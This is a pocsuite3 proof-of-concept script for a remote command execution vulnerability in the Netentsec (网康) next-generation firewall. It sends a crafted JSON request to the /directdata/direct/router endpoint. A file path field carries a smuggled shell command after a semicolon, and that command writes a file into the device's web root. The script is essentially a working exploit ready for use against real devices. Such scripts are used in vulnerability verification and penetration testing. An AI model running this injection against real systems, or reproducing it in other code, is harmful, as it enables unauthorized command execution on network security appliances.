# _*_ coding:utf-8 _*_
# @Time : 2023/11/20 20:47
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str
import json

class RCE(POCBase):
    pocDesc = ''' 网康防火墙远程命令执行漏洞 '''
    vulID = '0'
    version = '1.0'
    author = '公众号网络安全透视镜'
    vulDate = '2023-11-20'
    createDate = '2023-11-20'
    updateDate = '2023-11-20'
    name = '网康防火墙远程命令执行漏洞'
    appName = '网康下一代防火墙'



    def _verify(self):

        result = {}
        path = "/directdata/direct/router" # 参数
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
        }
        payload = {
            "action": "SSLVPN_Resource",
            "method": "deleteImage",
            "data": [{"data": [
                "/var/www/html/d.txt;echo 'This website has a vulnerability!!!' >/var/www/html/security.txt"]}],
            "type": "rpc",
            "tid": 17,
            "f8839p7rqtj": "="
        }
        data = json.dumps(payload)

        url = self.url + path

        try:
            response = requests.post(url, headers=headers, data=data)

        # 验证成功输出相关信息
            if response.status_code == 200 and 'true' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Name'] = payload
                result['VerifyInfo']['Resp'] = response.text
            return self.parse_output(result)

        except Exception as e:
            pass

register_poc(RCE)